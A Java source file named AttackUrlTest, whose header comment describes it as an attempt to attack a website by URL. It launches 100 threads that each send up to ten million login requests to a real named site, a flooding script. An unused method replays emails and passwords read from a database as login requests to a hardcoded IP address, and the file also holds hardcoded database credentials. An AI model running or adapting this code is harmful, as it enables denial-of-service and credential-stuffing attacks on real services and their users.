package com.test;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

import com.utils.DatabaseUtil;

/**
 * 尝试通过Url攻击一个网站
 * 
 * @author jiachengyu
 * 
 * @date 2014年8月29日
 */
public class AttackUrlTest {

	private static final int NUMBER_OF_THREAD = 100;
	
	public static void main(String[] args) {

		// attackLocal();
		MyAttackThread[] myats = new MyAttackThread[NUMBER_OF_THREAD];
		for(int i =0; i < NUMBER_OF_THREAD ; i++)
		{
			myats[i] = new MyAttackThread("ats"+i);
			new Thread(myats[i]).start();
		}
		System.err.println("----------------------  All Started !");
	}

	@SuppressWarnings("unused")
	private static void attackLocal() {
		String sql = "select email,password from userInfo where userId = ?";
		PreparedStatement pst = null;
		ResultSet rst = null;
		Connection conn = DatabaseUtil.getConnection(
				"jdbc:mysql://localhost:3306/cloudmate", "cloudmate",
				"cloudmate");
		HttpURLConnection connection = null;
		InputStream inputStream = null;
		InputStreamReader inrReader = null;
		BufferedReader bufferedReader = null;

		System.out.println("start attack ..... ");
		for (int i = 1; i < 1000; i++) {

			try {
				pst = conn.prepareStatement(sql);
				pst.setInt(1, i);
				rst = pst.executeQuery();
				while (rst.next()) {
					String email = rst.getString("email");
					String password = rst.getString("password");

					URL url = new URL(
							"http://http://115.28.133.73/cloudmate/Login.action?loginCheck=&email="
									+ email + "&password=" + password);
				    connection = (HttpURLConnection) url
							.openConnection();
					connection.setDefaultUseCaches(true);
					connection.setRequestMethod("GET");

					inputStream = connection.getInputStream();
					inrReader = new InputStreamReader(inputStream);
					bufferedReader = new BufferedReader(inrReader);

					StringBuffer sbBuffer = new StringBuffer();
					String string;

					while ((string = bufferedReader.readLine()) != null) {
						sbBuffer.append(new String(string.getBytes(), "UTF-8"));
					}
					
					System.out.println(sbBuffer.toString());

				}

			} catch (SQLException e) {
				e.printStackTrace();
			} catch (MalformedURLException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}

		DatabaseUtil.closeAll(rst, pst, conn);

		try {
			inputStream.close();
			bufferedReader.close();
			inrReader.close();
			connection.disconnect();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}

class MyAttackThread implements Runnable{

	private static final int ATTACK_TIMES = 10000000;
	public static long count = 0;
	private String threadName;
//	private StringBuffer sbBuffer = new StringBuffer();
	private String string;
	
	public MyAttackThread()
	{
		this.threadName = "def-name";
	}
	
	public MyAttackThread(String name)
	{
		this.threadName = name;
	}
	
	@Override
	public void run()
	{
		HttpURLConnection connection = null;
		InputStream inputStream = null;
		InputStreamReader inrReader = null;
		BufferedReader bufferedReader = null;
		System.out.println(this.threadName+" start attack zerker ..... ");
		for (int i = 1; i < ATTACK_TIMES; i++) {
			try {
				String userName = "";
				String email = "";
				String pass = "";
				
				URL url = new URL(
						"http://www.zealer.com/index/login?username=haha&passworld=test&remember=yes&verify=1");
			    connection = (HttpURLConnection) url.openConnection();
				connection.setDefaultUseCaches(true);
				connection.setRequestMethod("GET");

				inputStream = connection.getInputStream();
				inrReader = new InputStreamReader(inputStream);
				bufferedReader = new BufferedReader(inrReader);

//				StringBuffer sbBuffer = new StringBuffer();
//				String string;
				count++;

				if((string = bufferedReader.readLine()) != null && i % 10 == 0) {
//					sbBuffer.append(new String(string.getBytes(), "UTF-8"));
					System.out.println(count+"-------"+string);
				}

			} catch (MalformedURLException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}

			try {
				inputStream.close();
				bufferedReader.close();
				inrReader.close();
				connection.disconnect();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		
	}
}
